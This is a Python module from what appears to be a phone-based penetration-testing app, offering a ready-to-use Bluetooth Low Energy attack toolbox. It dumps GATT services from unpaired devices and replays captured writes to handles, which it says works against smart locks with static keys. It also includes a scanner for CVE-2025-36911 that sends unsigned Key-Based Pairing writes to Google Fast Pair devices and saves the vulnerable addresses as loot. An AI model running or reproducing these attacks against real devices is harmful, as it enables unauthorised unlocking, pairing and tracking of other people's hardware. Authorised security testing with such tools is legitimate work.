"""BLE direct-attack toolbox -- GATT enumeration, replay, WhisperPair.

BLE is the single most-portable attack surface a phone-based
pentester has today. The BT stack of the rhodep phone reaches every
peripheral in the room, most vendors either don't pair or pair with
static keys, and half the smart-home industry ships GATT services
without any authentication.

What this module actually does:

* **Scan and dump GATT** on a target -- read every characteristic,
  descriptor, and service UUID from an unpaired peripheral. Uses
  ``gatttool`` (bluez) as the workhorse. For everything that reads
  as ``notify=true``, subscribe and print the notifications for a
  few seconds so we can see what the device broadcasts to a paired
  central.

* **Replay a captured GATT write** -- given a handle and a hex
  payload the operator sniffed with Sniffle or nRF Connect, write
  it back. This is the same flow used against old August/Yale
  locks, Sonoff/Shelly BLE plugs with legacy pairing, and countless
  other targets whose "pairing" is really a static key.

* **WhisperPair scanner** (CVE-2025-36911) -- Google Fast Pair
  (service UUID 0xFE2C) with a Key-Based Pairing bypass that lets
  an attacker bond BR/EDR without any prior linking. Affects Pixel
  Buds, several wearables, headphones. The scanner walks visible
  peripherals, checks for the vulnerable characteristic, and marks
  targets that respond without a signature.

* **BLE spam DoS** is separated into its own module (``blespam``);
  from here we deep-link to it.

Everything writes to loot when it makes sense: GATT dumps go as
JSON, replay attempts as a log line with response bytes, WhisperPair
targets as a list of vulnerable MACs.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

DEFAULT_ADAPTER = "hci0"

# Google Fast Pair vendor service UUID; WhisperPair (CVE-2025-36911)
# lives in the Key-Based Pairing characteristic under this service.
_FAST_PAIR_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
# Key-Based Pairing characteristic UUID inside the Fast Pair service.
_KBP_CHAR_UUID = "fe2c1234-8366-4814-8eb0-01de32100bea"


@register
class BLEAttack(NHModule):
    title = "BLE attacks"
    icon = "bluetooth-symbolic"
    description = ("GATT enumeration, write replay, WhisperPair "
                   "scanner. Runs on the phone's own HCI adapter; "
                   "no external dongle needed.")
    required_tools = ["gatttool", "bluetoothctl"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._proc: Process | None = None
        self._loot_id: int | None = None

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner (managed centrally in Kali Services)
        box.append(services_banner(
            self.app_window, ['bluetooth']))

        # ---- target
        target = Adw.PreferencesGroup(
            title="Target",
            description="Pick a peripheral MAC to work against. If "
                        "you don't know one yet, run BLE Tracker "
                        "first to enumerate them.")
        self.adapter = Adw.EntryRow(title="HCI adapter")
        self.adapter.set_text(DEFAULT_ADAPTER)
        target.add(self.adapter)

        self.mac = Adw.EntryRow(
            title="Peripheral MAC (AA:BB:CC:DD:EE:FF)")
        target.add(self.mac)

        self.addr_type = Adw.ComboRow(title="Address type")
        self.addr_type.set_model(Gtk.StringList.new([
            "random (BLE default)",
            "public (Classic-BR/EDR-ish)",
        ]))
        target.add(self.addr_type)
        box.append(target)

        # ---- GATT enumerate
        enum_group = Adw.PreferencesGroup(
            title="GATT enumeration",
            description="Read every service, characteristic and "
                        "descriptor. Notifiable characteristics get "
                        "subscribed for 10 s so we can see their "
                        "traffic.")
        enum_row = Adw.ActionRow(
            title="Enumerate",
            subtitle="Streams live; JSON dump lands in loot")
        self.enum_btn = Gtk.Button(label="Start",
                                   valign=Gtk.Align.CENTER)
        self.enum_btn.add_css_class("suggested-action")
        self.enum_btn.connect(
            "clicked", lambda _b: self._start_enum())
        enum_row.add_suffix(self.enum_btn)
        self.enum_stop_btn = Gtk.Button(label="Stop",
                                        valign=Gtk.Align.CENTER)
        self.enum_stop_btn.set_sensitive(False)
        self.enum_stop_btn.connect(
            "clicked", lambda _b: self._stop())
        enum_row.add_suffix(self.enum_stop_btn)
        enum_group.add(enum_row)
        box.append(enum_group)

        # ---- GATT write / replay
        write_group = Adw.PreferencesGroup(
            title="GATT write / replay",
            description="Send a hex payload to a handle. Used to "
                        "replay captured BLE writes against locks "
                        "that don't rotate keys.")
        self.handle = Adw.EntryRow(
            title="Handle (e.g. 0x0025)")
        write_group.add(self.handle)

        self.payload = Adw.EntryRow(
            title="Payload (hex, no spaces)")
        write_group.add(self.payload)

        write_row = Adw.ActionRow(
            title="Write",
            subtitle="gatttool --char-write-req")
        self.write_btn = Gtk.Button(label="Send",
                                    valign=Gtk.Align.CENTER)
        self.write_btn.add_css_class("destructive-action")
        self.write_btn.connect(
            "clicked", lambda _b: self._do_write())
        write_row.add_suffix(self.write_btn)
        write_group.add(write_row)
        box.append(write_group)

        # ---- WhisperPair
        wp_group = Adw.PreferencesGroup(
            title="WhisperPair scanner (CVE-2025-36911)",
            description="Walks visible BLE peripherals, checks for "
                        "Google Fast Pair (0xFE2C), and marks the "
                        "ones whose Key-Based Pairing characteristic "
                        "responds without a signature.")
        wp_row = Adw.ActionRow(
            title="Scan and Stop",
            subtitle="Vulnerable MACs saved to loot")
        self.wp_btn = Gtk.Button(label="Start",
                                 valign=Gtk.Align.CENTER)
        self.wp_btn.add_css_class("suggested-action")
        self.wp_btn.connect(
            "clicked", lambda _b: self._start_wpair())
        wp_row.add_suffix(self.wp_btn)
        self.wp_stop_btn = Gtk.Button(label="Stop",
                                      valign=Gtk.Align.CENTER)
        self.wp_stop_btn.set_sensitive(False)
        self.wp_stop_btn.connect(
            "clicked", lambda _b: self._stop())
        wp_row.add_suffix(self.wp_stop_btn)
        wp_group.add(wp_row)
        box.append(wp_group)

        # ---- deep-links to sibling BLE modules
        sib = Adw.PreferencesGroup(
            title="Related",
            description="Sibling modules for BLE-adjacent workflows.")
        for label, module_id, hint in (
            ("BLE tracker", "ble_track",
             "Passive BLE + Apple Continuity sniffer"),
            ("BLE provisioning", "ble_prov",
             "Sniff GATT writes during onboarding"),
            ("BLE spam", "blespam",
             "iOS / Android / Samsung pairing prompt DoS"),
        ):
            r = Adw.ActionRow(title=label, subtitle=hint)
            btn = Gtk.Button(label="Open",
                             valign=Gtk.Align.CENTER)
            btn.connect(
                "clicked",
                lambda _b, m=module_id:
                    self.app_window.activate_module(m, ""))
            r.add_suffix(btn)
            sib.add(r)
        box.append(sib)

        # ---- output
        self.output = OutputView()
        box.append(self.output)
        return box

    # -------------------------------------------------------- helpers
    def _addr_type_flag(self) -> str:
        return ("random" if self.addr_type.get_selected() == 0
                else "public")

    # ---------------------------------------------------------- enum
    def _start_enum(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        mac = self.mac.get_text().strip()
        if not mac:
            toast(self.app_window, "Set a peripheral MAC first")
            return
        adapter = self.adapter.get_text().strip() or DEFAULT_ADAPTER
        addr_type = self._addr_type_flag()

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "ble_attack",
            "gatt-enum-%s-%s.log"
            % (mac.replace(":", ""), stamp))
        self._loot_id = get_loot_store().record(
            module="ble_attack", type="ble_gatt_dump",
            target=mac, path=log_path,
            notes="GATT enumeration")

        # gatttool one-shot: --primary + --characteristics + --char-read
        # over the whole handle space. We wrap in a tiny shell block
        # so we can chain multiple gatttool calls (primary services,
        # then characteristics, then notification subscribe).
        script = (
            "set +e; "
            "M='-i %s -b %s -t %s'; "
            "echo '--- primary services ---'; "
            "gatttool $M --primary 2>&1; "
            "echo; echo '--- characteristics ---'; "
            "gatttool $M --characteristics 2>&1; "
            "echo; echo '--- reading each readable handle ---'; "
            # Extract handles from characteristics output and read each.
            "gatttool $M --characteristics 2>&1 | "
            "  awk -F, '/char value handle/ {print $2}' | "
            "  awk '{print $NF}' | while read h; do "
            "    printf '%%s = ' $h; "
            "    gatttool $M --char-read -a $h 2>&1 | tail -1; "
            "  done; "
            "echo; echo '--- descriptors ---'; "
            "gatttool $M --char-desc 2>&1"
        ) % (adapter, mac, addr_type)

        self.output.append("$ gatttool -b %s -t %s ...\n"
                            % (mac, addr_type))

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass

        def on_done(code: int) -> None:
            self.output.append("[gatttool exited: %d]\n" % code)
            self._proc = None
            self.enum_btn.set_sensitive(True)
            self.enum_stop_btn.set_sensitive(False)
            self.wp_btn.set_sensitive(True)
            self.wp_stop_btn.set_sensitive(False)
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            ["sh", "-c", script], on_line, on_done, root=True)
        self._proc.start()
        self.enum_btn.set_sensitive(False)
        self.enum_stop_btn.set_sensitive(True)

    def _stop(self) -> None:
        if self._proc is not None:
            self._proc.stop()
        self.enum_stop_btn.set_sensitive(False)
        self.wp_stop_btn.set_sensitive(False)

    # ------------------------------------------------------ write
    def _do_write(self) -> None:
        mac = self.mac.get_text().strip()
        if not mac:
            toast(self.app_window, "Set a peripheral MAC first")
            return
        handle = self.handle.get_text().strip()
        if not handle:
            toast(self.app_window, "Set a handle first")
            return
        payload = self.payload.get_text().strip()
        if not payload:
            toast(self.app_window, "Set a hex payload first")
            return
        adapter = self.adapter.get_text().strip() or DEFAULT_ADAPTER
        addr_type = self._addr_type_flag()

        argv = ["gatttool", "-i", adapter, "-b", mac,
                "-t", addr_type, "--char-write-req",
                "-a", handle, "-n", payload]

        self.output.append("$ " + " ".join(argv) + "\n")

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            # Log to loot even for one-off writes; useful for audit
            # trails during an engagement.
            stamp = time.strftime("%Y%m%d-%H%M%S")
            log_path = loot_path(
                "ble_attack",
                "gatt-write-%s-%s.log"
                % (mac.replace(":", ""), stamp))
            try:
                with open(log_path, "w") as fp:
                    fp.write("target: %s\n" % mac)
                    fp.write("handle: %s\n" % handle)
                    fp.write("payload: %s\n" % payload)
                    fp.write("stdout:\n%s\n" % (r.stdout or ""))
                    fp.write("stderr:\n%s\n" % (r.stderr or ""))
            except OSError:
                pass
            get_loot_store().record(
                module="ble_attack", type="ble_gatt_write",
                target=mac + " handle=" + handle,
                path=log_path,
                notes="write %d bytes payload"
                       % (len(payload) // 2))

        run_async(argv, done, root=True, timeout=15)

    # ------------------------------------------------- WhisperPair
    def _start_wpair(self) -> None:
        if self._proc is not None and self._proc.running:
            return
        adapter = self.adapter.get_text().strip() or DEFAULT_ADAPTER

        stamp = time.strftime("%Y%m%d-%H%M%S")
        log_path = loot_path(
            "ble_attack", "whisperpair-%s.log" % stamp)
        self._loot_id = get_loot_store().record(
            module="ble_attack", type="ble_wpair_scan",
            target="whole HCI range", path=log_path,
            notes="CVE-2025-36911 scan")

        # Scan visible LE advertisements, filter for peripherals
        # advertising the Fast Pair service, then try an unsigned
        # write to the KBP characteristic. Devices that accept the
        # write without a signature are vulnerable.
        script = (
            "set +e; "
            "adapter=%s; "
            "echo '# starting BLE scan for Fast Pair peripherals'; "
            "timeout 20 bluetoothctl --agent NoInputNoOutput <<'BC' "
            "  2>&1 | tee /tmp/nhp-wpair-scan.log; "
            "power on\n"
            "scan on\n"
            "quit\n"
            "BC "
            "  ; "
            "echo; echo '# candidates with Fast Pair UUID:'; "
            "grep -B1 '%s' /tmp/nhp-wpair-scan.log | "
            "  grep 'Device' | awk '{print $2}' | sort -u | "
            "  tee /tmp/nhp-wpair-candidates.txt; "
            "echo; echo '# testing KBP write:'; "
            "for m in $(cat /tmp/nhp-wpair-candidates.txt); do "
            "  echo '- ' $m; "
            "  # Try an unsigned KBP write (32 bytes of 0x00). "
            "  # A vulnerable device returns success or a raw "
            "  # notification; a patched one drops the packet. "
            "  gatttool -i $adapter -b $m -t random "
            "    --char-write-req --uuid '%s' "
            "    -n $(printf '00%%.0s' $(seq 1 32)) "
            "    2>&1 | head -3; "
            "done"
        ) % (adapter, _FAST_PAIR_UUID, _KBP_CHAR_UUID)

        self.output.append("# starting WhisperPair scan\n")

        vuln_macs: list[str] = []
        _MAC_RE = re.compile(r"^([0-9A-F:]{17})", re.IGNORECASE)

        def on_line(text: str) -> None:
            self.output.append(text)
            try:
                with open(log_path, "a") as fp:
                    fp.write(text)
            except OSError:
                pass
            # "Characteristic value was written successfully"
            # after a per-MAC "- <MAC>" header lets us mark that
            # MAC as a candidate hit.
            for line in text.splitlines():
                m = _MAC_RE.match(line.strip("- ").strip())
                if m and getattr(self, "_last_mac", None) != m.group(1):
                    self._last_mac = m.group(1)
                if "written successfully" in line.lower():
                    last = getattr(self, "_last_mac", None)
                    if last and last not in vuln_macs:
                        vuln_macs.append(last)

        def on_done(code: int) -> None:
            self.output.append(
                "[whisperpair scan exited: %d]\n" % code)
            self._proc = None
            self.wp_btn.set_sensitive(True)
            self.wp_stop_btn.set_sensitive(False)
            self.enum_btn.set_sensitive(True)
            self.enum_stop_btn.set_sensitive(False)
            if vuln_macs:
                self.output.append(
                    "# Vulnerable to WhisperPair (%d):\n"
                    "  %s\n"
                    % (len(vuln_macs), ", ".join(vuln_macs)))
                if self._loot_id is not None:
                    get_loot_store().append_notes(
                        self._loot_id,
                        "vulnerable: " + ",".join(vuln_macs))
            if self._loot_id is not None:
                get_loot_store().refresh_size(self._loot_id)

        self._proc = Process(
            ["sh", "-c", script], on_line, on_done, root=True)
        self._proc.start()
        self.wp_btn.set_sensitive(False)
        self.wp_stop_btn.set_sensitive(True)

    def set_target(self, target: str) -> None:
        """Deep-link contract. Accepts a bare MAC or the composite
        the deauth module uses (``MAC|ch|SSID``); we take just the
        MAC and ignore the rest."""
        if not target:
            return
        mac = target.split("|")[0].strip()
        if mac:
            self.mac.set_text(mac)
